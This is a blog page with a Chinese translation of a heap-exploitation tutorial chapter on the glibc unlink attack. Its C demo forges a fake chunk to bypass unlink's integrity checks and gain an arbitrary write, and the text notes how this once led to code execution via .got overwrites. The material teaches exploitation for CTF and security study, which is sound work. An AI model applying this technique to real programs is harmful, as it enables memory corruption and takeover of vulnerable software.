<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name="author" content="Vancir" />
  <title>Heap Exploitation系列翻译-11 Unlink Exploit</title>
  <link rel="shortcut icon" href="/favicon.ico" />
  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
  <link rel="stylesheet" href="/media/css/style.css" />
  <link rel="stylesheet" href="/media/css/highlight.css" />
  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script type="text/javascript" src="/media/js/outliner.js"></script>
</head>
<!--  <body> 
-->
<script type="text/javascript">
  function setTimeSpan() {
    var date = new Date();
    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
  }

  Date.prototype.format = function (format) {
    var o =
      {
        "M+": this.getMonth() + 1, //month
        "d+": this.getDate(),    //day
        "h+": this.getHours(),   //hour
        "m+": this.getMinutes(), //minute
        "s+": this.getSeconds(), //second
        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
        "S": this.getMilliseconds() //millisecond
      }
    if (/(y+)/.test(format))
      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
    for (var k in o)
      if (new RegExp("(" + k + ")").test(format))
        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
    return format;
  }
</script>

<body onLoad="setInterval(setTimeSpan,1000);">
  <div id="container">
    <div id="main" role="main">
      <header>
        <h1>Heap Exploitation系列翻译-11 Unlink Exploit</h1>
      </header>
      <nav id="real_nav">
        <span>
          <a title="home" class="" href="/">home</a>
        </span>
        <span>
          <a title="categories" class="" href="/categories/">categories</a>
        </span>
        <span>
          <a title="tags" class="" href="/tags/">tags</a>
        </span>
        <span>
          <a title="tools" class="" href="/repo/">repo</a>
        </span>
        <span>
          <a title="tools" class="" href="/act/">act</a>
        </span>
        <span>
          <a title="tools" class="" href="/books/">books</a>
        </span>
        <span>
          <a title="tools" class="" href="/musics/">musics</a>
        </span>
        <span>
          <a title="tools" class="" href="/movies/">movies</a>
        </span>
        <span>
          <a title="links" class="" href="/friends/">friends</a>
        </span>
        <span>
          <a title="about" class="" href="/about/">about</a>
        </span>
        <span>
          <a title="feed" class="" href="/feed">subscribe</a>
        </span>
      </nav>
      <article class="content">
        <section class="meta">
<span class="time">
  <time datetime="2017-08-12">2017-08-12</time>
</span>

 | 
<span class="categories">
  categories
  
  <a href="/categories/#translations" title="translations">translations</a>&nbsp;
  
</span>


 | 
<span class="tags">
  tags
  
  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
  
  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
  
  <a href="/tags/#heap" title="heap">heap</a>&nbsp;
  
</span>

</section>
<section class="post">
<blockquote>
  <p>本文是对Dhaval Kapil的<a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a>系列教程的译文</p>
</blockquote>

<p>这项攻击技术曾十分常用, 然而之后在<code class="highlighter-rouge">unlink</code>宏里添加的两项安全检查(“corrupted size vs. prev_size”)和(“corrupted double-linked list”)在一定程度上减少了这种攻击. 不过我们依旧值得花时间去掌握这项技术. 该攻击技术利用了在bin中移除堆块时<code class="highlighter-rouge">unlink</code>宏进行的指针操作发生的漏洞</p>

<p>考虑以下示例代码(下载完整版本: <a href="https://heap-exploitation.dhavalkapil.com/assets/files/unlink_exploit.c">这里</a> )</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>               <span class="c1">// padding
</span><span class="p">};</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span> <span class="o">*</span><span class="n">chunk2</span><span class="p">;</span>
<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fake_chunk</span><span class="p">,</span> <span class="o">*</span><span class="n">chunk2_hdr</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

<span class="c1">// First grab two chunks (non fast)
</span><span class="n">chunk1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>        <span class="c1">// Points to 0xa0e010
</span><span class="n">chunk2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>        <span class="c1">// Points to 0xa0e0a0
</span>
<span class="c1">// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header
</span>
<span class="c1">// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
</span><span class="n">fake_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk1</span><span class="p">;</span>
<span class="n">fake_chunk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">chunk1</span> <span class="o">-</span> <span class="mi">3</span><span class="p">);</span> <span class="c1">// Ensures P-&gt;fd-&gt;bk == P
</span><span class="n">fake_chunk</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">chunk1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">// Ensures P-&gt;bk-&gt;fd == P
</span>
<span class="c1">// Next modify the header of chunk2 to pass all security checks
</span><span class="n">chunk2_hdr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">chunk2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
<span class="n">chunk2_hdr</span><span class="o">-&gt;</span><span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>  <span class="c1">// chunk1's data region size
</span><span class="n">chunk2_hdr</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="mi">1</span><span class="p">;</span>        <span class="c1">// Unsetting prev_in_use bit
</span>
<span class="c1">// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>

<span class="n">chunk1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>

<span class="n">strcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">"Victim's data"</span><span class="p">);</span>

<span class="c1">// Overwrite victim's data using chunk1
</span><span class="n">chunk1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x002164656b636168LL</span><span class="p">;</span>   <span class="c1">// hex for "hacked!"
</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>         <span class="c1">// Prints "hacked!"
</span></code></pre></div></div>

<p>相比其他攻击, 这看上去可能会有些复杂. 首先我们申请了两个大小为<code class="highlighter-rouge">0x80</code>的堆块 <code class="highlighter-rouge">chunk1</code>和 <code class="highlighter-rouge">chunk2</code>以确保两者都在smallbin范围内. 接下来我们假定攻击者以某种方式无界限地控制<code class="highlighter-rouge">chunk1</code>的内容(比如说可以使用一些不安全的函数比如<code class="highlighter-rouge">strcpy</code>来读取用户输入). 要注意, 两个堆块在内存里是紧挨着的. 上面展示的代码使用了一个自定义的结构体<code class="highlighter-rouge">chunk_structure</code>单纯只是为了清楚的展示而已. 在一个攻击情景中, 攻击者可能只是简单地发送一些数据填充了<code class="highlighter-rouge">chunk1</code>, 这样也是能达到相同效果的</p>

<p>在<code class="highlighter-rouge">chunk1</code>的<code class="highlighter-rouge">data</code>域创建了一个新的伪造堆块. <code class="highlighter-rouge">fd</code>和<code class="highlighter-rouge">bk</code>指针经过调整以绕过”corrupted double-linked list”安全检查. 攻击者的输入内容溢出到了<code class="highlighter-rouge">chunk2</code>的头部并设置了对应的<code class="highlighter-rouge">prev_size</code>和<code class="highlighter-rouge">prev_in_use</code>位. 这也确保了一旦<code class="highlighter-rouge">chunk2</code>被释放, 我们的<code class="highlighter-rouge">fake_chunk</code>都会被认作为’空闲的’并且将进行<code class="highlighter-rouge">unlink</code>操作. 下面的图标很好地展示了不同内存区域的当前状态:</p>

<p><img src="https://heap-exploitation.dhavalkapil.com/assets/images/unlink_before_free.png" alt="Unlink before call to free" /></p>

<p>务必要弄明白为什么可以通过<code class="highlighter-rouge">P-&gt;fd-&gt;bk == P</code> 和 <code class="highlighter-rouge">P-&gt;bk-&gt;fd == P</code>的检查. 这会告诉你如何去调整伪堆块的<code class="highlighter-rouge">fd</code>和<code class="highlighter-rouge">bk</code>指针</p>

<p>一旦<code class="highlighter-rouge">chunk2</code>被释放, 它就会作为small bin被处理. 我们回想一下, prev chunks和next chunks会被检查它们是否被释放. 如果其中任意一个堆块被检查到已释放, 它就会因为合并连续的空闲堆块而进行<code class="highlighter-rouge">unlink</code>操作. <code class="highlighter-rouge">unlink</code>宏执行以下两个修改指针的指令:</p>

<ol>
  <li>设置 <code class="highlighter-rouge">P-&gt;fd-&gt;bk</code> = <code class="highlighter-rouge">P-&gt;bk</code>.</li>
  <li>设置 <code class="highlighter-rouge">P-&gt;bk-&gt;fd</code> = <code class="highlighter-rouge">P-&gt;fd</code>.</li>
</ol>

<p>In this case, both <code class="highlighter-rouge">P-&gt;fd-&gt;bk</code> and <code class="highlighter-rouge">P-&gt;bk-&gt;fd</code> point to the same location so only the second update is noticed. The following diagram shows the effects of the second update just after <code class="highlighter-rouge">chunk2</code> is freed.</p>

<p>在这种情形下, <code class="highlighter-rouge">P-&gt;fd-&gt;bk</code> 和 <code class="highlighter-rouge">P-&gt;bk-&gt;fd</code>都指向相同的地方因此我们只需要注意第二次操作即可. 下面的图标展示了在<code class="highlighter-rouge">chunk2</code>被释放后第二次操作的影响.</p>

<p><img src="https://heap-exploitation.dhavalkapil.com/assets/images/unlink_after_free.png" alt="Unlink after call to free" /></p>

<p>现在, 我们让<code class="highlighter-rouge">chunk1</code>在它之后(<code class="highlighter-rouge">&amp;chunk-3</code>)指向了3个地址(16位). 因此, <code class="highlighter-rouge">chunk1[3]</code>实际上就是<code class="highlighter-rouge">chunk1</code>. 改变<code class="highlighter-rouge">chunk1[3]</code>就是改变<code class="highlighter-rouge">chunk1</code>. 要注意的是, 一个攻击者很有可能获得机会去更新<code class="highlighter-rouge">chunk1</code>(<code class="highlighter-rouge">这里是chunk1[3]</code>)位置的数据, 而非<code class="highlighter-rouge">chunk1</code>本身. 这样我们完成了这次攻击. 在本例中, <code class="highlighter-rouge">chunk1</code>用于指向变量’data’并且通过改变<code class="highlighter-rouge">chunk1</code>从而影响到了该变量</p>

<p>早先, 在缺少<code class="highlighter-rouge">unlink</code>的安全检查的时候, 那两项<code class="highlighter-rouge">unlink</code>宏的指令常用语显示任意地址写. 通过覆写<code class="highlighter-rouge">.got</code>段从而导致任意代码执行</p>

</section>
<section align="right">
<br/>
<span>
	<a  href="/2017/08/12/shrinking-free-chunks/" class="pageNav"  >Previous</a>
	&nbsp;&nbsp;&nbsp;
	<a  href="/2017/08/14/unsafe-unlink-example/" class="pageNav"  >Next</a>
</span>
</section>

<script type="text/javascript">
$(function(){
  $(document).keydown(function(e) {
    var url = false;
        if (e.which == 37 || e.which == 74) {  // Left arrow and J
            
        url = 'http://www.vancir.com/2017/08/12/shrinking-free-chunks/';
        
        }
        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
            
        url = 'http://www.vancir.com/2017/08/14/unsafe-unlink-example/';
        
        }
        if (url) {
            window.location = url;
        }
  });
})
</script>

      </article>
      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
        <img src="/assets/btt.png" />
      </a>
    </div>
    <footer>
      <p>
        <small>
          Powered by
          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
          <a href="/about/">Vancir</a> |
          <span class="label label-info" id="timeSpan"></span>
        </small>
      </p>
    </footer>
  </div>
</body>

</html>